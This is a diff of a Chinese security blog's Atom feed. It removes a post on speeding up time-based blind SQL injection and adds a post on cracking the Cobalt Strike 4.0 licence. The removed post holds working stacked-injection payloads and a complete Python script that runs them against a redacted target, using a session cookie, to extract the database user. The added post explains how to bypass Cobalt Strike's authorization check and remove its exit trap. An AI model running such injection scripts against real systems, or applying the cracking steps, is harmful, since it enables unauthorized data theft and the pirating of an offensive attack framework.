@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://blog.thekingofduck.com</id>
     <title>CoolCat&apos; Blog</title>
-    <updated>2021-05-06T04:15:10.042Z</updated>
+    <updated>2021-06-01T01:58:22.883Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://blog.thekingofduck.com"/>
     <link rel="self" href="https://blog.thekingofduck.com/atom.xml"/>
@@ -120,92 +120,6 @@ public class ExceptionController {
 <p>搜索了一下应该是Linksys路由的命令注入.</p>
 <figure data-type="image" tabindex="13"><img src="https://blog.thekingofduck.com/post-images/1612093860509.png" alt="" loading="lazy"></figure>
 <p>看起来是未授权相关的漏洞,80端口配置了很低从其他蜜罐上扒下来的Server头,可能是其中一款产品的洞吧,涉及的产品太多,百度没搜到这个路由,无法验证了。</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[极端条件下时间盲注加速的另一种思路]]></title>
-        <id>https://blog.thekingofduck.com/post/sql-inject-bypass/</id>
-        <link href="https://blog.thekingofduck.com/post/sql-inject-bypass/">
-        </link>
-        <updated>2020-10-24T11:27:33.000Z</updated>
-        <content type="html"><![CDATA[<p>摸底情况</p>
-<p>环境:<code>python</code>+<code>django</code>+<code>pymysql</code></p>
-<p>注入点应该是出现在order by 后面,无回显,程序会分离<code>;</code>符号,并当做两个语句来执行,也就是存在堆叠注入,丢给sqlmap跑确实也识别出来了,但是没法正常跑数据,人工探测发现mysql字符处理相关的函数均无法正常执行(过滤or写法问题?),离谱的是ifnull这类函数都无法执,探测下来已知的可执行的函数只有<code>sleep()</code>,<code>length()</code>,<code>users()</code>,<code>version()</code>等这类可执行。</p>
-<p>只能时间盲注没得选,绕过也容易,payload如下:</p>
-<pre><code>select case when((select binary database()) like &quot;test%&quot;)then sleep(3) else sleep(0) end;
-</code></pre>
-<figure data-type="image" tabindex="1"><img src="https://blog.thekingofduck.com/post-images/1603551425773.jpg" alt="" loading="lazy"></figure>
-<figure data-type="image" tabindex="2"><img src="https://blog.thekingofduck.com/post-images/1603551438310.jpg" alt="" loading="lazy"></figure>
-<p>不允许操作字符那就不操作,只对比就好。写完Poc产生一个问题。平常盲注都是查询出单个字符串再去和所有字符串对比,但如果把模糊查询条件改成<code>like &quot;%a%&quot;</code>,先查询一下所有字符串字符串，看是否在目标字段中,并将存在于目标字段中的字符聚合起来,再用<code>like &quot;abc%&quot;</code>去将存在的字符串进行排序,效率会不会高很多？</p>
-<p>假设查询结果为:<code>95b17c3b195983f7ef37358a6db07e35</code><br>
-不考虑特俗字符串,盲注情况以下62个字符串需要对比:</p>
-<pre><code>abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789
-</code></pre>
-<p>不适应任何技巧情况下最多需要需要对比32x62=1984次</p>
-<p>先将查询结果转成ASCII码,上诉62个字符的ASCII码进行二分法对比,最多需要对比ln62/ln2*32≈192次</p>
-<p>使用上诉思路查询最多次数为62 + 14*32 = 510,其中14为查询结果中出现的14个独立字符串,假设值为<code>00000000000000000000000000000000</code>时，最坏查询次数为62 + 1*32 = 94,也就是说查询结果重复得越多查询次数越少,正常情况下还是不如转ascii再二分法对比效果好,但如果遇到这种不能分割字符串的情况,这也不失是个方法。</p>
-<p>demo:</p>
-<pre><code>import requests
-import urllib3
-
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
-proxies = {
-  &quot;http&quot;:  &quot;http://127.0.0.1:8080&quot;,
-  &quot;https&quot;: &quot;http://127.0.0.1:8080&quot;,
-}
-
-def sqli(payload):
-
-    session = requests.Session()
-
-    paramsGet = {
-        &quot;dxxxxx&quot;: &quot;xxxx');{}&amp;&quot;.format(payload)}
-    headers = {&quot;Connection&quot;: &quot;close&quot;,
-               &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_2; pt-br) AppleWebKit/525.13 (KHTML, like Gecko) Version/3.1 Safari/525.13&quot;,
-               &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept&quot;: &quot;*/*&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;}
-    cookies = {&quot;SESSION&quot;: &quot;r5q1phi49syxxxxxxxxxxxxxxxxxxxxxxxxxxxxrod59m3u2t&quot;}
-
-    try:
-        session.get(&quot;https://xxxxxxxxxxxxxxxxxxxxxxch&quot;, params=paramsGet,
-                               headers=headers, cookies=cookies, proxies=proxies, verify=False, timeout=3)
-        return False
-    except:
-        return True
-
-
-if __name__ == '__main__':
-
-
-    #select case when((select database()) like \&quot;%%\&quot;)then sleep(2) else sleep(0) end;
-    existStrs = &quot;&quot;
-
-    strs = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@.ß&quot;
-    print(&quot;[+] 正在遍历返回值中存在的字符串...&quot;)
-    for s in strs:
-        payload = &quot;select case when((select binary user()) like \&quot;%{}%\&quot;)then sleep(2) else sleep(0) end;&quot;.format(s)
-        if sqli(payload):
-            existStrs += s
-            print(existStrs)
-
-    print(&quot;[+] 返回值中存在的字符串共有: {}&quot;.format(existStrs))
-    print(&quot;[+] 返回值排序中...&quot;)
-
-    result = &quot;&quot;
-
-    for num in range(1,15):
-        tmp = &quot;&quot;
-        for s2 in existStrs:
-            tmp = result + s2
-            payload2 = &quot;select case when((select binary user()) like \&quot;{}%\&quot;)then sleep(2) else sleep(0) end;&quot;.format(tmp)
-            if sqli(payload2):
-                result += s2
-                break
-        print(result)
-    print(&quot;[+] 返回值: {}&quot;.format(result))
-
-</code></pre>
-<figure data-type="image" tabindex="3"><img src="https://blog.thekingofduck.com/post-images/1603551452123.jpg" alt="" loading="lazy"></figure>
 ]]></content>
     </entry>
     <entry>
@@ -455,6 +369,65 @@ function burpJsEncrypter(rawPayload){
 <figure data-type="image" tabindex="7"><img src="https://blog.thekingofduck.com/post-images/cs4_2/15846863899548/15846902345978.jpg" alt="-w399" loading="lazy"></figure>
 <figure data-type="image" tabindex="8"><img src="https://blog.thekingofduck.com/post-images/cs4_2/15846863899548/15846902520176.jpg" alt="-w845" loading="lazy"></figure>
 <p>至于完整的代码怎么调整,就自己考虑咯...</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Patch Cobalt Strike 4.0]]></title>
+        <id>https://blog.thekingofduck.com/post/Patch-Cobalt-Strike-4.0/</id>
+        <link href="https://blog.thekingofduck.com/post/Patch-Cobalt-Strike-4.0/">
+        </link>
+        <updated>2020-03-18T22:56:21.000Z</updated>
+        <content type="html"><![CDATA[<p>拿到得程序如下:</p>
+<figure data-type="image" tabindex="1"><img src="https://blog.thekingofduck.com/post-images/cs4/15845636285780/15845637149700.jpg" alt="-w270" loading="lazy"></figure>
+<p>压缩包里面存在附一条启动命令：</p>
+<pre><code>java -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -Xms512M -Xmx1024M -jar cobaltstrike.jar $*
+</code></pre>
+<p>启动报错：</p>
+<figure data-type="image" tabindex="2"><img src="https://blog.thekingofduck.com/post-images/cs4/15845636285780/15845638463523.jpg" alt="-w320" loading="lazy"></figure>
+<p>这里的说的<code>authorization file</code>明显就是<code>cobaltstrike.auth</code>了</p>
+<p>简单搜一下：</p>
+<figure data-type="image" tabindex="3"><img src="https://blog.thekingofduck.com/post-images/cs4/15845636285780/15845639620558.jpg" alt="-w476" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="https://blog.thekingofduck.com/post-images/cs4/15845636285780/15845665841791.jpg" alt="-w1323" loading="lazy"></figure>
+<p>把代码都复制过来，处理下报错：</p>
+<figure data-type="image" tabindex="5"><img src="https://blog.thekingofduck.com/post-images/cs4/15845636285780/15845665605145.jpg" alt="-w1586" loading="lazy"></figure>
+<p>调用：</p>
+<figure data-type="image" tabindex="6"><img src="https://blog.thekingofduck.com/post-images/cs4/15845636285780/15845666707405.jpg" alt="-w454" loading="lazy"></figure>
+<p>上来就先<code>Invalid authorization file</code>了<br>
+明显resources/authkey.pub没有加载过来。</p>
+<figure data-type="image" tabindex="7"><img src="https://blog.thekingofduck.com/post-images/cs4/15845636285780/15845671915765.jpg" alt="-w1527" loading="lazy"></figure>
+<p>改一下：</p>
+<figure data-type="image" tabindex="8"><img src="https://blog.thekingofduck.com/post-images/cs4/15845636285780/15845673713054.jpg" alt="-w1176" loading="lazy"></figure>
+<p>给出得密钥文件运行到这里就直接return结束了。</p>
+<figure data-type="image" tabindex="9"><img src="https://blog.thekingofduck.com/post-images/cs4/15845636285780/2F39DF26-A29B-46EA-9F12-129C8D383DEB.png" alt="2F39DF26-A29B-46EA-9F12-129C8D383DEB" loading="lazy"></figure>
+<p>既然等于0就结束了，那么把这里得0修改成其他值是不是就可以了？(cs3就是这个破解思路)</p>
+<figure data-type="image" tabindex="10"><img src="https://blog.thekingofduck.com/post-images/cs4/15845636285780/15845696379774.jpg" alt="-w316" loading="lazy"></figure>
+<p>明显是不得行的。在License方法中有校验：</p>
+<figure data-type="image" tabindex="11"><img src="https://blog.thekingofduck.com/post-images/cs4/15845636285780/15845696241758.jpg" alt="-w907" loading="lazy"></figure>
+<p>checkLicenseGUI函数得第一个判断就是检测凭证是否有效。值来源于:</p>
+<figure data-type="image" tabindex="12"><img src="https://blog.thekingofduck.com/post-images/cs4/15845636285780/15845698414371.jpg" alt="-w277" loading="lazy"></figure>
+<p>对应修改一下：</p>
+<figure data-type="image" tabindex="13"><img src="https://blog.thekingofduck.com/post-images/cs4/15845636285780/15845737520463.jpg" alt="-w277" loading="lazy"></figure>
+<p>然后提示过期:</p>
+<figure data-type="image" tabindex="14"><img src="https://blog.thekingofduck.com/post-images/cs4/15845636285780/15845700315413.jpg" alt="-w483" loading="lazy"></figure>
+<p>懒人得做法：直接将这个判断删掉。</p>
+<figure data-type="image" tabindex="15"><img src="https://blog.thekingofduck.com/post-images/cs4/15845636285780/15845706501051.jpg" alt="-w1018" loading="lazy"></figure>
+<p>改完就可以直接进加载出UI来了。<br>
+<img src="https://blog.thekingofduck.com/post-images/cs4/15845636285780/67ADD37F-7926-40B1-9AC8-AFAFFF6ECB0E.png" alt="67ADD37F-7926-40B1-9AC8-AFAFFF6ECB0E" loading="lazy"></p>
+<p>对应的也报了不少错误，并不能正常运行...说明还有多处校验了.</p>
+<p>这种动不动就删减代码的破解方式自然不是最佳方案。</p>
+<p>回归到：</p>
+<figure data-type="image" tabindex="16"><img src="https://blog.thekingofduck.com/post-images/cs4/15845636285780/15845710917584.jpg" alt="-w904" loading="lazy"></figure>
+<p>既然是因为密钥文件不对而导致的这里对比失败,那么直接硬写一条正确的结果进去即可:</p>
+<figure data-type="image" tabindex="17"><img src="https://blog.thekingofduck.com/post-images/cs4/15845636285780/15845712703919.jpg" alt="-w1007" loading="lazy"></figure>
+<p>比如：</p>
+<figure data-type="image" tabindex="18"><img src="https://blog.thekingofduck.com/post-images/cs4/15845636285780/C4C0BB95-040B-46B2-9C01-DE985474A38A.png" alt="C4C0BB95-040B-46B2-9C01-DE985474A38A" loading="lazy"></figure>
+<figure data-type="image" tabindex="19"><img src="https://blog.thekingofduck.com/post-images/cs4/15845636285780/15845720512205.jpg" alt="-w1236" loading="lazy"></figure>
+<p>至于这个正确的结果如何拿到，就得感谢有花钱购买以及分享出来的师傅了给予白嫖的机会了。</p>
+<figure data-type="image" tabindex="20"><img src="https://blog.thekingofduck.com/post-images/cs4/15845636285780/15845719954394.jpg" alt="-w955" loading="lazy"></figure>
+<p>去除exit暗桩：</p>
+<figure data-type="image" tabindex="21"><img src="https://blog.thekingofduck.com/post-images/cs4/15845636285780/1.png" alt="-w955" loading="lazy"></figure>
+<p>指纹似乎不存在，listener问题也不存在。</p>
+<p>阿门，原谅我没钱只能白嫖了...</p>
 ]]></content>
     </entry>
 </feed>
